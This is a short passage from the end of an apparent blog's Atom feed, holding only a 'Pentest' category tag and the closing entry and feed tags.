    <category term="Pentest" scheme="https://blog.secriy.com/tags/Pentest/"/>
    
  </entry>
  
</feed>
